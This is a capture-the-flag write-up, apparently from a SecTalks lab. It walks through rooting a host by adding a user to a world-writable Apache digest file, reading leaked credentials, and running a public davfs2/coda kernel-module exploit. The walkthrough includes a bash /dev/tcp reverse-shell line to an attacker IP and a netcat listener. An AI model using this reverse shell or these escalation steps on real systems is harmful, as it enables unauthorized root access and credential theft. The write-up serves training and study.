# SYD0x0b

```console
sectalks@sectalks:~$ ls
davfs2-1.4.7.tar.gz
```
System is probably vulnerable to [this](https://www.exploit-db.com/exploits/28806/) davfs2 privilege escalation vulnerability affecting version 1.4.6/1.4.7
```console
sectalks@sectalks:~$ grep davfs /etc/fstab
http://localhost/webdav /mnt/dav davfs user,noauto,uid=dave,file_mode=600,dir_mode=700 0 0
sectalks@sectalks:~$ grep davfs /etc/group
davfs2:x:1001:dave
```
Dave can mount davfs mounts and there is one defined in fstab
```console
sectalks@sectalks:~$ lsmod | grep -cE 'coda|fuse'
0
```
Both the coda and fuse modules are not loaded, which is a prerequisite for the exploit
```console
sectalks@sectalks:~$ netstat -utan | grep LISTEN
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp6       0      0 :::80                   :::*                    LISTEN
tcp6       0      0 :::22                   :::*                    LISTEN
```
There is a web server running on this system
```console
sectalks@sectalks:~$ find /var/www/
/var/www/
/var/www/webdav
/var/www/webdav/test.txt
/var/www/webdav/flag1.txt
/var/www/index.html
sectalks@sectalks:~$ ls -l /var/www/webdav/
total 8
-rw-r----- 1 root www-data 25 2015-10-18 06:10 flag1.txt
-rw-r----- 1 root www-data 34 2015-10-18 06:10 test.txt
```
There is a folder named webdav in www root which contains a flag. The file is readable by www-data.
```console
sectalks@sectalks:~$ find /etc/apache2/ -perm 777
---8<---
/etc/apache2/mods-enabled/cgid.load
/etc/apache2/sites-enabled/000-default
/etc/apache2/users.password
---8<---
sectalks@sectalks:~$ cat /etc/apache2/users.password
mrdav:webdav:3610916e5f1909204e0826f0f59954a6
```
There is a world readable/writable authentication file
```console
sectalks@sectalks:~$ head /etc/apache2/sites-enabled/000-default
```
```apache
DavLockDB /var/www/DavLock
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        Alias /webdav /var/www/webdav
        <Directory /var/www/webdav>
                DAV On
                AuthType Digest
                AuthName "webdav"
                AuthUserFile /etc/apache2/users.password
                Require valid-user
```
The authentication file contains htdigest credentials. We could crack password for the existing user but it's easier to just add our own user to the file.
```console
sectalks@sectalks:~$ htdigest /etc/apache2/users.password webdav z00nx
Adding user z00nx in realm webdav
New password:
Re-type new password:
sectalks@sectalks:~$ wget --user z00nx --ask-password http://localhost/webdav/flag1.txt -O - -q
Password for user `z00nx':
dave:davesshittypassword
sectalks@sectalks:~$ wget --user z00nx --ask-password http://localhost/webdav/test.txt -O - -q
Password for user `z00nx':
test test testes
I'm so juvenile.
```
We now have credentials for dave
```console
dave@sectalks:~$ wget --no-check-certificate https://www.exploit-db.com/download/28806 -O 28806.temp.txt
--2015-11-07 02:15:54--  https://www.exploit-db.com/download/28806
Resolving www.exploit-db.com... 192.124.249.8
Connecting to www.exploit-db.com|192.124.249.8|:443... connected.
WARNING: certificate common name `*.mycloudproxy.com' doesn't match requested host name `www.exploit-db.com'.
HTTP request sent, awaiting response... 200 OK
Length: 7198 (7.0K) [application/txt]
Saving to: `28806.temp.txt'

100%[======================================>] 7,198       --.-K/s   in 0s

2015-11-07 02:15:54 (354 MB/s) - `28806.temp.txt' saved [7198/7198]
dave@sectalks:~$ tr -d '\r' < 28806.temp.txt > 28806.txt
dave@sectalks:~$ sed -n '40,73p' 28806.txt > coda.c
dave@sectalks:~$ sed -n '84,90p' 28806.txt > Makefile
dave@sectalks:~$ sed -n '101,192p' 28806.txt > exploit.sh
dave@sectalks:~$ echo '#!/usr/bin/env bash' > /home/dave/rootprog
dave@sectalks:~$ echo 'bash -i >& /dev/tcp/192.168.0.157/4444 0>&1' >> /home/dave/rootprog
dave@sectalks:~$ chmod +x /home/dave/rootprog
dave@sectalks:~$ chmod +x exploit.sh
dave@sectalks:~$ echo 'kernel_fs       coda' >> .davfs2/davfs2.conf
```
Lets download the exploit, remove dos line endings and split the file into the three seperate files.
We then create a shell script which will create a reverse shell back to us.
We need to add the kernel_fs line into the davfs2.conf file which is missing and is required for the exploit to work.
```console
root@kali:~# nc -lvvp 4444
listening on [any] 4444 ...
```
On our system we'll start a netcat listener to receive the reverse shell
```console
dave@sectalks:~$ ./exploit.sh
#######################################
Specify the full path of the kernel module which you want to load
Leave empty if you wish to compile it now
Understand that you need kernel headers, make and gcc for successful compilation
#######################################

make -C /lib/modules/2.6.32-21-generic-pae/build M=/home/dave modules
make[1]: Entering directory `/usr/src/linux-headers-2.6.32-21-generic-pae'
  CC [M]  /home/dave/coda.o
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /home/dave/coda.mod.o
  LD [M]  /home/dave/coda.ko
make[1]: Leaving directory `/usr/src/linux-headers-2.6.32-21-generic-pae'
#######################################
Copying the modules in use for the running kernel in the local directory
#######################################
#######################################
Copying coda.ko module
#######################################
#######################################
Setting the 'modules.dep' and running depmod
#######################################
#######################################
Specify the user-mode ELF which you whish to copy in /tmp/rootprog that will be run as root. Default value is /home/dave/rootprog
WARNING !!!!!!!! YOU HAVE ONLY 1 SHOT !!!!! unmounting webdav partitions doesn't unload the coda.ko module
#######################################
/home/dave/rootprog
#######################################
Setting MODPROBE_OPTIONS variable
#######################################
#######################################
Now, check the the /home/dave/.davfs2/davfs.conf. Modify the default value of 'kernel_fs' to coda eg:
# General Options
# ---------------

# dav_user        davfs2            # system wide config file only
# dav_group       davfs2            # system wide config file only
# ignore_home                       # system wide config file only
kernel_fs       coda
# buf_size        16                 # KiByte
#######################################
#######################################
Then, check /etc/fstab for remote webdav servers which the user can mount, eg:
https://www.crushftp.com/demo/   /home/foo/dav   davfs   noauto,user   0   0
#######################################
#######################################
If the remote webdav is authenticated, ensure to have valid credentials. The run 'mount /home/foo/dav' inside this terminal'
#######################################
dave@sectalks:~$ mount /mnt/dav/
```
Lets run the exploit and specify our command which will be run as root. We finally need to run mount against a user mountable davfs share to trigger the exploit.
```console
root@kali:~# nc -lvvp 4444
listening on [any] 4444 ...
connect to [192.168.0.157] from sectalks.localnet [192.168.0.179] 56331
# id
id
uid=0(root) gid=0(root)
# pwd
pwd
/
# cd /root
cd /root
# ls
ls
flag.txt
# cat flag.txt
cat flag.txt
WebDAV gives me the heebie-jeebies.
```
The exploit triggered and we received our reverse shell as root. In root's home directory we find the final flag which is **WebDAV gives me the heebie-jeebies.**
